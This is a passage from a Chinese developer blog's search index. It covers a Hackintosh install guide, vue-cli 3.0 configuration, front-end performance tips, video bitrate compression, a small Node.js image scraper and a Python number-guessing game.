密码:w4h6\n[迅雷下载](thunder://QUFodHRwczovL21pcnJvcnMuZHRvcHMuY2MvaXNvL01BQyBPUy+62rn70KGx+C9tYWNPUyBIaWdoIFNpZXJyYSAxMC4xMy41KDE3Rjc3KSBJbnN0YWxsZXIgd2l0aCBDbG92ZXIgNDUxMi5kbWdaWg=)\n\n刻录软件：Tranmac [点击下载]（http://down-www.newasp.net/pcdown/soft/soft1/transmac.rar）\n\n## 我的 Clover 文件（仅供参考）\n链接:https://pan.baidu.com/s/1YZK9FaeZsYo6Q-zxE6zUyg  密码:nhe9\n\n## 安装教程\n\n可以参考这个视频\n\n<iframe src=\"//player.bilibili.com/player.html?aid=23052183&cid=38606842&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" style=\"width: 100%; height: 600px;\"></iframe>\n\n## 重点\n- 新建 `ESP` 分区必须大于 `200M`,否则可能出现无法抹盘。这个分区目的是为了安装完以后作为引导分区。把U盘上的 `EFI` 文件夹下面的 `Clover` 复制到这个分区的 `EFI` 文件夹下即可实现 Clover 硬盘引导系统。\n\n\n## 可能遇到的问题\n\nQ1：系统没有声音？\n> A：把 `VoodooHDA.kext` 这个声卡驱动放到 `clover/kexts/Other/ ` 重启即可！\n\nQ：电脑开机黑屏，进不去 `BOIS` ？\n> A：把内存条和硬盘拔掉，重新插入即可！（ 别问为什么，我就是这么解决的 233...）\n\n\n\n","tags":["Mac OS","黑苹果系统"]},{"title":"vue-cli 3.0 初体验","url":"/2018/06/02/20180602-1/","content":"\nvue-cli 是 vue 官方团队推出的一款快速开发 vue 项目的构建工具，具有开箱即用并且提供简洁的自定义配置等功能。 vue-cli 从 2.0 到 3.0 的升级有太多的新东西可以说了，但是不可能在本文中列举所有的内容，这篇文章作为一个对比 2.0 升级功能的导读，让你快速了解 3.0 更新的内容。\n<!-- more -->\n一.创建项目：\n\n创建项目命令的变化。\n\n```\nvue create my-project\n```\n\n3.0 版本包括默认预设配置 和 用户自定义配置。\n\n自定义功能配置包括以下功能：\n\n- TypeScript\n- Progressive Web App (PWA) Support\n- Router\n- Vuex\n- CSS Pre-processors\n- Linter / Formatter\n- Unit Testing\n- E2E Testing\n\n可以注意到 3.0 版本直接新加入了 TypeScript 以及 PWA 的支持。\n\n在选择 CSS 预处理后会提示选择哪一种预处理器：\n\n- SCSS/SASS\n- LESS\n- Stylus\n\n以及 eslint 规范的选择：\n\n- ESLint with error prevention only\n- ESLint + Airbnb config\n- ESLint + Standard config\n- ESLint + Prettier\n\n最后选择 Babel, PostCSS, ESLint 等自定义配置的存放位置：\n\n-In dedicated config files\n- In package.json\n\n选择好后，可以把以上配置存储为预设值，以后通过 vue-cli 创建的其他项目将都采用刚才的配置。\n\n## 二. 项目目录结构变化：\n\n我们对比发现 vue-cli 3.0 默认项目目录相比 2.0 来说精简了很多。\n\n- 移除了配置文件目录， config 和 build 文件夹。\n- 移除了 static 文件夹，新增 public 文件夹，并且 index.html 移动到 public 中。\n- 在 src 文件夹中新增了 views 文件夹，用于分类 视图组件 和 公共组件。\n\n## vue-cli 3.0 到底有多简洁呢? 下面我们一起来看下目录结构\n下面是我删除了 `node_modules` 文件夹后的目录结构\n\n```\n├── babel.config.js\n├── package.json\n├── package-lock.json\n├── public\n│   ├── favicon.ico\n│   └── index.html\n└── src\n    ├── App.vue\n    ├── assets\n    │   └── logo.png\n    ├── components\n    │   └── HelloWorld.vue\n    └── main.js\n\n4 directories, 9 files\n\n```\n\n\n## 三.移除了配置文件目录后如何自定义配置。\n\n在 vue-cli 3.0 中的配置统一在 vue.config.js 自定义\n\n这里列出来所有可用的选项及其默认值 (所有的选项都不是必选项)：\n\n``` js\nmodule.exports = {\n  // 项目部署的基础路径\n  // 我们默认假设你的应用将会部署在域名的根部，\n  // 比如 https://www.my-app.com/\n  // 如果你的应用时部署在一个子路径下，那么你需要在这里\n  // 指定子路径。比如，如果你的应用部署在\n  // https://www.foobar.com/my-app/\n  // 那么将这个值改为 `/my-app/`\n  baseUrl: '/',\n\n  // 将构建好的文件输出到哪里\n  outputDir: 'dist',\n\n  // 放置静态资源的地方 (js/css//img/font/...)\n  assetsDir: '',\n\n  // 是否在保存的时候使用 `eslint-loader` 进行检查。\n  // 有效的值：`ture` | `false` | `\"error\"`\n  // 当设置为 `\"error\"` 时，检查出的错误会触发编译失败。\n  lintOnSave: true,\n\n  // 使用带有浏览器内编译器的完整构建版本\n  // 查阅 https://cn.vuejs.org/v2/guide/installation.html#运行时-编译器-vs-只包含运行时\n  compiler: false,\n\n  // babel-loader 默认会跳过 node_modules 依赖。\n  // 通过这个选项可以显式转译一个依赖。\n  transpileDependencies: [/* string or regex */],\n\n  // 是否为生产环境构建生成 source map？\n  productionSourceMap: true,\n\n  // 调整内部的 webpack 配置。\n  // 查阅 https://github.com/vuejs/vue-docs-zh-cn/blob/master/vue-cli/webpack.md\n  chainWebpack: () => {},\n  configureWebpack: () => {},\n\n  // CSS 相关选项\n  css: {\n    // 将组件内的 CSS 提取到一个单独的 CSS 文件 (只用在生产环境中)\n    // 也可以是一个传递给 `extract-text-webpack-plugin` 的选项对象\n    extract: true,\n\n    // 是否开启 CSS source map？\n    sourceMap: false,\n\n    // 为预处理器的 loader 传递自定义选项。比如传递给\n    // sass-loader 时，使用 `{ sass: { ... } }`。\n    loaderOptions: {},\n\n    // 为所有的 CSS 及其预处理文件开启 CSS Modules。\n    // 这个选项不会影响 `*.vue` 文件。\n    modules: false\n  },\n\n  // 在生产环境下为 Babel 和 TypeScript 使用 `thread-loader`\n  // 在多核机器下会默认开启。\n  parallel: require('os').cpus().length > 1,\n\n  // PWA 插件的选项。\n  // 查阅 https://github.com/vuejs/vue-docs-zh-cn/blob/master/vue-cli-plugin-pwa/README.md\n  pwa: {},\n\n  // 配置 webpack-dev-server 行为。\n  devServer: {\n    open: process.platform === 'darwin',\n    host: '0.0.0.0',\n    port: 8080,\n    https: false,\n    hotOnly: false,\n    // 查阅 https://github.com/vuejs/vue-docs-zh-cn/blob/master/vue-cli/cli-service.md#配置代理\n    proxy: null, // string | Object\n    before: app => {}\n  },\n\n  // 三方插件的选项\n  pluginOptions: {\n    // ...\n  }\n}\n```\n\n调整 webpack 配置最简单的方式就是在 vue.config.js 中的 configureWebpack 选项提供一个对象，该对象将会被 webpack-merge 合并入最终的 webpack 配置。\n\n示例代码：配置 webpack 新增一个插件。\n\n```js\n// vue.config.js\nmodule.exports = {\n configureWebpack: {\n  plugins: [\n   new MyAwesomeWebpackPlugin()\n  ]\n }\n}\n```\n\n修改插件选项的参数你需要熟悉 webpack-chain 的 API 并阅读一些源码以便了解如何权衡这个选项的全部配置项，但是它给了你比直接修改 webpack 配置中的值更灵活且安全的方式。\n\n```js\n// vue.config.js\nmodule.exports = {\n  chainWebpack: config => {\n    config\n      .plugin('html')\n      .tap(args => {\n        return [/* new args to pass to html-webpack-plugin's constructor */]\n      })\n  }\n}\n```\n\n\n","tags":["vue","vue-cli","webapp"],"categories":["代码笔记"]},{"title":"网站性能优化篇（一）","url":"/2018/06/01/20180601-1/","content":"\n\n\n\n## 前言\n### 1） 浏览器渲染页面的过程\n<!-- more -->\n从耗时的角度，浏览器请求、加载、渲染一个页面，时间花在下面五件事情上：\n> - 1.1 DNS 查询\n- 1.2 TCP 连接\n- 1.3 HTTP 请求即响应\n- 1.4 服务器响应\n- 1.5 客户端渲染\n\n下面我主要从客户端渲染的角度来详细解析：\n\n> - 处理 HTML 标记并构建 DOM 树。\n- 处理 CSS 标记并构建 CSSOM 树。\n- 将 DOM 与 CSSOM 合并成一个渲染树。\n- 根据渲染树来布局，以计算每个节点的几何信息。\n- 将各个节点绘制到屏幕上。\n\n需要明白，这五个步骤并不一定一次性顺序完成。如果 DOM 或 CSSOM 被修改，以上过程需要重复执行，这样才能计算出哪些像素需要在屏幕上进行重新渲染。实际页面中，CSS 与 JavaScript 往往会多次修改 DOM 和 CSSOM，下面就来看看它们的影响方式。\n\n### 阻塞渲染：CSS 与 JavaScript\n\n默认情况下，CSS 被视为阻塞渲染的资源，这意味着浏览器将不会渲染任何已处理的内容，直至`CSSOM`构建完毕。JavaScript 不仅可以读取和修改 DOM 属性，还可以读取和修改 CSSOM 属性。\n\n存在阻塞的 CSS 资源时，浏览器会延迟 JavaScript 的执行和 DOM 构建。另外：当浏览器遇到一个 script 标记时，DOM 构建将暂停，直至脚本完成执行。JavaScript 可以查询和修改 DOM 与 CSSOM。CSSOM 构建时，JavaScript 执行将暂停，直至 CSSOM 就绪。\n\n所以，script 标签的位置很重要。实际使用时，可以遵循下面两个原则：\n\n> CSS 优先：引入顺序上，CSS 资源先于 JavaScript 资源。\n\nJavaScript 应尽量少影响 DOM 的构建。\n\n浏览器的发展日益加快（目前的 Chrome 官方稳定版是 61），具体的渲染策略会不断进化，但了解这些原理后，就能想通它进化的逻辑。下面来看看 CSS 与 JavaScript 具体会怎样阻塞资源。\n\n**css**\n\n```html\n<style> p { color: red; }</style>\n<link rel=\"stylesheet\" href=\"index.css\">\n```\n这样的 link 标签（无论是否 inline）会被视为阻塞渲染的资源，浏览器会优先处理这些 CSS 资源，直至 CSSOM 构建完毕。\n\n渲染树（Render-Tree）的关键渲染路径中，要求同时具有 DOM 和 CSSOM，之后才会构建渲染树。即，HTML 和 CSS 都是阻塞渲染的资源。HTML 显然是必需的，因为包括我们希望显示的文本在内的内容，都在 DOM 中存放，那么可以从 CSS 上想办法。\n\n最容易想到的当然是**精简 CSS 并尽快提供它**。除此之外，还可以用媒体类型（media type）和媒体查询（media query）来解除对渲染的阻塞。\n\n```html\n<link href=\"index.css\" rel=\"stylesheet\">\n<link href=\"print.css\" rel=\"stylesheet\" media=\"print\">\n<link href=\"other.css\" rel=\"stylesheet\" media=\"(min-width: 30em) and (orientation: landscape)\">\n```\n第一个资源会加载并阻塞。\n第二个资源设置了媒体类型，会加载但不会阻塞，print 声明只在打印网页时使用。\n第三个资源提供了媒体查询，会在符合条件时阻塞渲染。\n\n**JavaScript**\n\nJavaScript 的情况比 CSS 要更复杂一些。观察下面的代码：\n\n```html\n<p>Do not go gentle into that good night,</p>\n<script>console.log(\"inline\")</script>\n<p>Old age should burn and rave at close of day;</p>\n<script src=\"app.js\"></script>\n<p>Rage, rage against the dying of the light.</p>\n\n<p>Do not go gentle into that good night,</p>\n<script src=\"app.js\"></script>\n<p>Old age should burn and rave at close of day;</p>\n<script>console.log(\"inline\")</script>\n<p>Rage, rage against the dying of the light.</p>\n```\n\n这样的 script 标签会阻塞 HTML 解析，无论是不是 inline-script。上面的 P 标签会从上到下解析，这个过程会被两段 JavaScript 分别打断一次（加载并且执行的时间段内）。\n\n所以实际工程中，我们常常将资源**放到文档底部**。\n\n**改变阻塞模式：`defer` 与 `async` **\n\n为什么要将 script 加载的 defer 与 async 方式放到后面呢？因为这两种方式是的出现，全是由于前面讲的那些阻塞条件的存在。换句话说，defer 与 async 方式可以改变之前的那些阻塞情形。\n\n首先，注意 async 与 defer 属性对于 inline-script 都是无效的，所以下面这个示例中三个 script 标签的代码会从上到下依次执行。\n\n```JavaScript\n<!-- 按照从上到下的顺序输出 1 2 3 -->\n<script async>\n  console.log(\"1\");\n</script>\n<script defer>\n  console.log(\"2\");\n</script>\n<script>\n  console.log(\"3\");\n</script>\n```\n故，下面两节讨论的内容都是针对设置了 src 属性的 script 标签。\n\n** defer **\n\n```html\n<script src=\"app1.js\" defer></script>\n<script src=\"app2.js\" defer></script>\n<script src=\"app3.js\" defer></script>\n```\n\ndefer 属性表示延迟执行引入的 JavaScript，即这段 JavaScript 加载时 HTML 并未停止解析，这两个过程是并行的。整个 document 解析完毕且 defer-script 也加载完成之后（这两件事情的顺序无关），会执行所有由 defer-script 加载的 JavaScript 代码，然后触发 DOMContentLoaded 事件。\n\ndefer 不会改变 script 中代码的执行顺序，示例代码会按照 1、2、3 的顺序执行。所以，defer 与相比普通 script，有两点区别：载入 JavaScript 文件时不阻塞 HTML 的解析，执行阶段被放到 HTML 标签解析完成之后。\n\n** async **\n\n```html\n<script src=\"app.js\" async></script>\n<script src=\"ad.js\" async></script>\n<script src=\"statistics.js\" async></script>\n```\n\n** document.createElement **\n\n使用 document.createElement 创建的 script 默认是异步的，示例如下。\n\n```JavaScript\nconsole.log(document.createElement(\"script\").async); // true\n```\n\n所以，通过动态添加 script 标签引入 JavaScript 文件默认是不会阻塞页面的。如果想同步执行，需要将 async 属性人为设置为 false。\n\n如果使用 document.createElement 创建 link 标签会怎样呢？\n\n```JavaScript\nconst style = document.createElement(\"link\");\nstyle.rel = \"stylesheet\";\nstyle.href = \"index.css\";\ndocument.head.appendChild(style); // 阻塞？\n```\n\n**document.write 与 innerHTML**\n\n通过 document.write 添加的 link 或 script 标签都相当于添加在 `document` 中的标签，因为它操作的是 `document stream`（所以对于 `loaded` 状态的页面使用 `document.write` 会自动调用document.open，这会覆盖原有文档内容）。即正常情况下， `link` 会阻塞渲染，`script` 会同步执行。不过这是不推荐的方式，`Chrome` 已经会显示警告，提示未来有可能禁止这样引入。如果给这种方式引入的 `script` 添加 `async` 属性，`Chrome` 会检查是否同源，对于非同源的 `async-script` 是不允许这么引入的。\n\n如果使用 `innerHTML` 引入 `script` 标签，其中的 `JavaScript` 不会执行。当然，可以通过 `eval() `来手工处理，不过不推荐。如果引入 `link` 标签，我试验过在 `Chrome` 中是可以起作用的。另外，`outerHTML`、 `insertAdjacentHTML()`应该也是相同的行为，我并没有试验。这三者应该用于文本的操作，即只使用它们添加 `text` 或普通 `HTMLElement`\n\n\nso ,我们来看看雅虎工程师的总结\n\n![](https://img.aotu.io/wangcainuan/2016-03-16-optimization/%E9%9B%85%E8%99%8E35%E6%9D%A1%E5%86%9B%E8%A7%84.jpg)\n\n\n## 2)前端资源优化\n\n### 2.1 图片资源压缩（tinypng ）\n\n图片无损压缩神站- [tinypng.com](https://tinypng.com/)\n\n- [TinyPNG做什么？](https://tinypng.com/)\n\nTinyPNG使用智能有损压缩技术来减少PNG文件的文件大小。 通过有选择地减少图像中的颜色数量，需要更少的字节来存储数据。 效果几乎看不见，但是它在文件大小上造成了很大的差异！\n\n- 我为什么要使用[TinyPNG？](https://tinypng.com/)\n\nPNG很有用，因为它是可以存储部分透明图像的唯一广泛支持的格式。 格式使用压缩，但文件可能仍然很大。 使用TinyPNG缩小应用程序和网站的图像。 它将更快地使用更少的带宽和负载。\n\n[![tinypng.com](/img/20180601-3.png)](https://tinypng.com/)\n\n\n### 2.2 使用雪碧图（CSS Sprite）\n\n雪碧图的概念大家一定在开发中经常听见，其实雪碧图是减小请求数的示范性代表。而且很奇妙的是，多张图片拼在一块后，总体积会比之前所有图片的体积之和小（你可以亲自试试）。这里给大家推荐一个自动化生成雪碧图的工具：[https://www.toptal.com/developers/css/sprite-generator](https://www.toptal.com/developers/css/sprite-generator)。只要你添加相关资源文件，他就会自动帮你生成雪碧图以及对应的 `CSS` 样式，你要做的，只是 `download` 和 `copy`。\n\n![演示](/img/20180601-4.png)\n\n\n### 2.3 使用字体图标（iconfont）\n网址：[www.iconfont.cn/](http://www.iconfont.cn/)\n不论是压缩后的图片，还是雪碧图，终归还是图片，只要是图片，就还是会占用大量网络传输资源。但是字体图标的出现，却让前端开发者看到了另外一个神奇的世界。我最喜欢用的是阿里矢量图标库 ，里面有大量的矢量图资源，而且你只需要像在淘宝采购一样把他们添加至购物车就能把它们带回家，整理完资源后还能自动生成CDN链接，可以说是完美的一条龙服务了。\n\n![iconfont](/img/20180601-5.png)\n\n### 2.4 使用 CDN （BootCDN）\n网址：[www.bootcdn.cn](http://www.bootcdn.cn/)\n为什么一定要使用 `CDN`？\n简单来讲，使用 `CDN` 可以让你的网站中引用的一些常见的资源（css & js）加载的更快,更稳定。尤其是对于网站中使用了大量的静态资源，效果更加明显。\n\n[CDN 介绍参考这里](https://www.zhihu.com/question/37353035)\n\n### 2.4 图片懒加载（jQuery_lazyload）\n\n网址：[https://github.com/tuupola/jquery_lazyload](https://github.com/tuupola/jquery_lazyload)\n\n通过给网站中用到的图片设置懒加载，让不在可视区域的图片延时加载，可以加快网页加载的速度。这对网站优化显得非常重要！\n\n\n### 2.5 小图转 Base64\n\n通过把小图转换成 `base64` 格式，直接写到 `HTML` 中。可以减少网络请求！\n\n\n## 3）服务器性能优化\n\n### 3.1.浏览器缓存\n\n我们都知道，浏览器在向服务器发起请求前，会先查询本地是否有相同的文件，如果有，就会直接拉取本地缓存，如果没有才会发起资源请求。\n\n浏览器默认的缓存是放在内存内的，但我们知道，内存里的缓存会因为进程的结束或者说浏览器的关闭而被清除，而存在硬盘里的缓存才能够被长期保留下去。很多时候，我们在network面板中各请求的size项里，会看到两种不同的状态：from memory cache 和 from disk cache，前者指缓存来自内存，后者指缓存来自硬盘。而控制缓存存放位置的，不是别人，就是我们在服务器上设置的Etag字段。在浏览器接收到服务器响应后，会检测响应头部（Header），如果有Etag字段，那么浏览器就会将本次缓存写入硬盘中。之所以拉取缓存会出现200、304两种不同的状态码，取决于浏览器是否有向服务器发起验证请求。 \n\n只有向服务器发起验证请求并确认缓存未被更新，才会返回304状态码。这里我以nginx为例，谈谈如何配置缓存:\n\n首先，我们先进入nginx的配置文档\n\n```shell\n$ vim nginxPath/conf/nginx.conf\n```\n\n在配置文档内插入如下两项：\n\n\n```shell\netag on;   //开启etag验证\nexpires 7d;    //设置缓存过期时间为7天\n\n```\n打开我们的网站，在chrome devtools的network面板中观察我们的请求资源，如果在响应头部看见Etag和Expires字段，就说明我们的缓存配置成功了。\n\n![缓存配置](https://user-gold-cdn.xitu.io/2018/5/28/163a4d01fe069bbc?imageView2/0/w/1280/h/960/ignore-error/1)\n\n### 3.2 资源打包压缩\n\n我们之前所作的浏览器缓存工作，只有在用户第二次访问我们的页面才能起到效果，如果要在用户首次打开页面就实现优良的性能，必须对资源进行优化。我们常将网络性能优化措施归结为三大方面：减少请求数、减小请求资源体积、提升网络传输速率。现在，让我们逐个击破：结合前端工程化思想，我们在对上线文件进行自动化打包编译时，通常都需要打包工具的协助，这里我推荐`webpack`，我通常都使用`Gulp`和`Grunt`来编译。\n\n\n### 我的网站性能监测\n\n![网站性能监测](/img/20180530-2.jpeg)","tags":["优化","网站"]},{"title":"视频原理了解一下（压缩）","url":"/2018/05/27/20180527-1/","content":"\n<!-- more -->\n\n## 前言\n\n前些天朋友圈看到阿里小胡子哥说的一句话，我觉得非常好。\n\n> 做技术的人，应该更多的去思考为什么有这项技术，为什么要学这项技术以及为什么要放弃这项技术。\n\n是的，这句话还是很有感触的。以前对于这个领域真的可以说是漫无目的的学习（想通过写代码一夜暴富的目的困扰了我很多年，哈哈），后来逐渐随着自己知识面的延伸，领悟到的原理性的东西越深。才越发的明白，这条路还很远。\n\n\n## 回到主题\n\n今天总结一下前些日子通过视频压缩发现的一些不可思意的事情。 我在网站上用到的一些视频，基本我都是通过`Premiere` 处理的，由于 `Premiere` 渲染过后的视频太大了，放到网站上播放汇会变得非常卡顿。我已开始以为是服务器问题，后来换了服务器发现不是这个原因。于是我开始把问题定位到视频本身上面。\n\n\n**结果：神奇的事情发生了！400 MB => 40 MB ?**\n\n仅仅通过改变视频的`比特率` 为 `768`即可，就是这么简单！\n压缩后的视频画质基本看不出来和之前有任何变化，但是大小却减小了百分之十！这到底是什么原理，让我来一探究竟！\n\n后面的内容比较专业，如果你只是寻找压缩视频的方法。后面的内容基本可以跳过了，我们继续！\n\n<hr>\n## 比特率是什么？\n\n![比特率](/img/20180527-5.png)\n\n比特率是指每秒传送的比特(bit)数。单位为 bps(Bit Per Second)，比特率越高，传送数据速度越快。声音中的比特率是指将模拟声音信号转换成数字声音信号后，单位时间内的二进制数据量，是间接衡量音频质量的一个指标。 视频中的比特率（码率）原理与声音中的相同，都是指由模拟信号转换为数字信号后，单位时间内的二进制数据量。\n\n在通信和计算机领域，比特率（Bit rate，变量Rbit）是单位时间内传输或处理的比特的数量。比特率经常在通信领域用作连接速度、传输速度、信道容量、最大吞吐量和数字带宽容量的同义词。\n\n1000 bit/s = 1 kbit/s （一千位每秒）\n1000 kbit/s = 1 Mbit/s （一兆或一百万位每秒）\n1000 Mbit/s = 1 Gbit/s (一吉比特或十亿位每秒）。\n\n（此处K和M分别为1000和1000000，而不是涉及计算机存储器容量时的1024和1048576）\n\n大的比特率，使用国际单位制词头：\n\n1,000 bps= 【1kbps】 =1,000 bit/s= 0.97656 Kibi bit/s\n1,000,000 bps= 【1Mbps】 =1,000,000 bit/s= 0.95367 Mebi bit/s\n1,000,000,000 bps= 【1Gbps】 =1,000,000,000 bit/s= 0.93132 Gibi bit/s\n常利用比特率衡量声音和视频文件质量。例子：音频文件中： 8 kbps 通话质量， 32 kbps 中波广播质量， 96 kbps FM广播质量， 128 kbps 普通MP3质量，1411 Kbps 16位CD质量当描述比特率的时候，二进制乘数词头几乎从来不使用而基本使用国际单位制词头作为标准，十进制含义，不是旧的计算机初始的二进制含义。二进制更多的应用于单位字节/秒（byte/s），而不是电信相关的典型用法。有时在一些特殊的上下文中有必要查找单位的定义。\n\n### 在计算机中\n\n比特率是指每秒传送的比特（bit）数。单位为bps(Bit Per Second），比特率越高，传送的数据越大。比特率表示经过编码（压缩）后的音、视频数据每秒钟需要用多少个比特来表示，而比特就是二进制里面最小的单位，要么是0，要么是1。比特率与音、视频压缩的关系，简单的说就是比特率越高，音、视频的质量就越好，但编码后的文件就越大；如果比特率越少则情况刚好相反。\n\n计算机中的信息都是二进制的0和1来表示，其中每一个0或1被称作一个位，用小写b表示，即bit（位）；大写B表示byte，即字节，一个字节=八个位，即1B=8b；前面的大写K表示千的意思，即千个位（Kb或千个字节（KB）。表示文件的大小单位，一般都使用字节（KB）来表示文件的大小。Kbps：首先要了解的是，ps指的是/s，即每秒。Kbps指的是网络速度，也就是每秒钟传送多少个千位的信息（K表示千位，Kb表示的是多少千个位），为了在直观上显得网络的传输速度较快，一般公司都使用kb（千位）来表示，如果是KBps，则表示每秒传送多少千字节。1KBps=8Kbps。ADSL上网时的网速是512Kbps，如果转换成字节，就是512/8=64KBps（即64千字节每秒）。\n\n\n## H.264 是什么\n\n![H.264](/img/20180527-4.jpg)\n\n> 所谓视频编码方式就是指通过特定的压缩技术，将某个视频格式的文件转换成另一种视频格式文件的方式。视频流传输中最为重要的编解码标准有国际电联的H.261、H.263、H.264，运动静止图像专家组的M-JPEG和国际标准化组织运动图像专家组的MPEG系列标准，此外在互联网上被广泛应用的还有Real-Networks的RealVideo、微软公司的WMV以及Apple公司的QuickTime等。\n\n这是百度百科的官话，我再来翻译的简单点就是\n\n## 视频编码基本原理\n\n![视频压缩编码标准H.264](/img/20180527-3.jpg)","tags":["video","压缩"],"categories":["代码笔记"]},{"title":"nodejs编写蜘蛛爬虫程序","url":"/2018/05/26/nodejs_pachong/","content":"基于node的超简单蜘蛛爬行程序,一秒钟抓取200张图片。妥妥的。代码总共40行，史上最简单的爬虫程序！\n\n# 史上最简单的网络爬虫\n\n### 1、简介\n - 功能：自动下载某网站的美女图片.\n - 运行环境：node.js\n - 难度系数：简单的一笔（总共46行代码加注释）\n\n\n## 2、安装运行环境\n\nhttp://nodejs.org/download/\n## 安装依赖包\nnpm install\n## 运行程序\nnode app.js\n<!-- more -->\n### 可能遇到的问题\n\nQ： 安装node.js遇到问题，该怎么办？\n\nA： 这个您可以在我的网站留言 地址 adymilk.cn 或者百度搜索 三步枫 也可以找到我的网站\n\nQ：代码可以直接复制运行吗？\n\nA：在你node环境安装好了的前提下是可以直接复制运行起来的，建议你还是先看懂代码。我有详细的注释\n\n### 代码\n\n```\n\n\nvar request = require('request');// 引入网络请求模块\nvar fs = require('fs'); //引入网络流模块\nvar path = require('path'); // 引入路径操作模块\nvar cheerio = require('cheerio');// 引入html数据解析模块\nvar requrl='';// 这是我们的目标网址\nvar baseUrl = 'http://www.mmjpg.com/';//这是我们要爬去的网站首页\n\nfor (var i=1; i<2; i++){//这个的20 最高为65 因为网站图片就65页\n    requrl= baseUrl +'home/' + i ;//通过循环我们可以遍历所有页面的图片\n    console.log(requrl);\nconsole.log('第'+ i + '页图片准备下载中......');\n    request(requrl, function (error, response, body) {\n        if (!error && response.statusCode == 200) {\n            acquireData(body);//发送 request 请求，如果没有错误就返回数据\n        }\n    })\n}\n//获取数据函数\nfunction acquireData(data) {\n    var $ = cheerio.load(data);//通过上门我们引入的cheerio模块提供的方法，解析数据\n    var meizi = $('.pic ul li a img').toArray();//选择图片所在的 dom结构在封装成数组\n    console.log(meizi.length);//打印数组长度\n    var len = meizi.length; // 把数组的长度赋给 len\n    for (var i=0; i<len; i++) {\n        var imgsrc = meizi[i].attribs.src;//通过 attribs 方法得到每张图片的src地址\n        console.log(imgsrc);\n        var filename = parseUrlForFileName(imgsrc);  //调用生成文件名方法\n        downloadImg(imgsrc,filename,function() {//调用下载方法下载图片，并且保存在根目录下的images下\n        });\n    }\n}\n//生成文件名方法 parseUrlForFileName 见名知意 把url地址转化成文件名\nfunction parseUrlForFileName(address) {\n    var filename = path.basename(address);\n    return filename;\n}\nvar downloadImg = function(uri, filename, callback){\n    request.head(uri, function(err, res, body){\n        if (err) {\n            console.log('err: '+ err);\n            return false;\n        }\n        console.log('res: '+ res);\n        console.log(filename+\"图片下载完毕！尽情欣赏吧！\");\n        request(uri).pipe(fs.createWriteStream('images/'+filename)).on('close', callback);\n        //调用request的管道来下载到 images文件夹下\n    });\n};\n\n```\n\n视频演示在这里看：[我的Bilibili视频](http://www.bilibili.com/video/av10114888/)\n\n代码下载 ：[github](https://github.com/adymilk/node.js-Web-spider)\n\n### 结束\n\n有问题，请留言\n","tags":["node.js","蜘蛛爬虫"],"categories":["代码笔记"]},{"title":"用Python 开发一个小游戏","url":"/2018/05/18/20180518-3/","content":"\n## 写在前面\n\n这个游戏没有华丽界面，也没有刺激的过渡动画。初始界面是这样的..\n<!-- more -->\n![游戏截图](https://raw.githubusercontent.com/adymilk/Python-demo/master/screenshot/compare-game.png)\n\n如果你是一个把 `terminal` 玩的飞起的极客，你一定会非常喜欢这种黑白搭配。很神秘是吧？今天我们的游戏设计就从这样的一个命令行界面开始。\n\n## 游戏分析\n\n游戏的玩法很简单，上面的截图一看大家可能就会联想到我们平时玩过的一个猜数字游戏。我们公司在晨会上这个游戏玩的概率就非常高，也是我非常喜欢的一个互动游戏。现在我们来分析下游戏的逻辑！\n\n> 1、首先，系统需要在一个数字区间内随机选中一个数字作为神秘数。\n2、假如用户第一次没猜中，系统需要根据用户没猜中的数字缩小数字区间。游戏继续，用户根据系统最新提供的数字区间继续猜。以此类推！\n3、用户猜中，游戏结束！\n\n\n## 关键点分析\n\n**随机数是如何产生的？**\n\n```python\nimport random\n\n# 获取一个随机整数\nrandom_num = random.randint(0,100)\n```\n\n这里的 `random_num` 存储的值即是随机数。接下来我们会用到！\n\n** 假如用户第一次没猜中，系统是如何自动缩小数字区间的呢？**\n```python\n# 这里需要声明3个变量\n\nkey_status = 0 # 随机数是否被猜中\nmax = 100 # 默认数字区间的最大值\nmin = 0 # 默认数字区间的最小值\n\n```\n\n这样我们就可以在用户没猜中的情况下，使用用户猜测的数字和系统随机数进行比较。\n- 如果用户猜测的数字大于系统随机数。那么`max` = 用户猜测的数字，`min` = 0。紧接着把区间最大值赋值变量`max`，`max` = 用户猜测的数字。\n- 如果用户猜测的数字小于系统随机数。那么`max` = 100，`min` = 用户猜测的数字。紧接着把区间最小值赋值给变量`min`，`min` = 用户猜测的数字。\n- 接下来循环判断这个逻辑，直到用户猜中系统随机数，游戏结束！\n\n\n\n**完整代码如下**\n\n```python\n# 获取一个随机整数\n\trandom_num = random.randint(0,100)\n\t# 记录当前的时间\n\tstart_time = time.time();\n\tkey_status = 0\n\tcount = 0\n\tmax = 100\n\tmin = 0 \n\tprint('请输入一个 0-100 的整数')\n\twhile (key_status == 0):\n\t\tprint('\\n\\n')\n\t\tuser_input = input('请输入：')\n\t\tprint('\\n')\n\t\tif (user_input.isdigit() and int(user_input) >= 0 and int(user_input) <= 100):\n\n\t\t\tif (int(user_input) != random_num):\n\t\t\t\tif (int(user_input) < random_num):\n\t\t\t\t\tprint('很遗憾，没猜对哦！给你个提示：' + str(user_input) + ' —— ' + str(max))\n\t\t\t\t\tmin = int(user_input)\t\t\t\t\t\n\t\t\t\telse:\n\t\t\t\t\tprint('很遗憾，没猜对哦！给你个提示：' + str(min) + ' —— ' + str(user_input))\n\t\t\t\t\tmax = int(user_input)\n\t\t\t\tprint('————————————再试一次———————————————')\n\t\t\t\tkey_status = 0\n\t\t\t\tcount = count + 1\n\t\t\telse:\n\t\t\t\tprint('————————————————————————————————————————猜对啦！———————————————————————————————————————————————————————\\n\\n')\n\n\t\t\t\tprint('！！！恭喜你猜中了！！！快去买彩票吧！\\n\\n')\n\n\t\t\t\tprint('————————————————————————————————————————猜对啦！———————————————————————————————————————————————————————\\n\\n')\n\t\t\t\tend_time = time.time()\n\t\t\t\tprint('游戏总共耗时：',int(end_time - start_time),'秒')\n\t\t\t\tif int(end_time - start_time) < 8:\n\t\t\t\t\tprint('游戏总共有效尝试次数：',count + 1,' 次，','击败了全国 95% 的选手')\n\t\t\t\telif int(end_time - start_time) >8 and int(end_time - start_time) < 15:\n\t\t\t\t\tprint('游戏总共有效尝试次数：',count + 1,' 次，','击败了全国 85% 的选手')\n\t\t\t\telse:\n\t\t\t\t\tprint('游戏总共有效尝试次数：',count + 1,' 次，','击败了全国 60% 的选手')\n\n\t\t\t\tkey_status = 1\n\t\t\t\tprint('\\n\\n游戏结束！')\n\t\telse:\nprint('输入的数据不合法！请输入一个 0 —— 100 的整数')\n```\n\n## 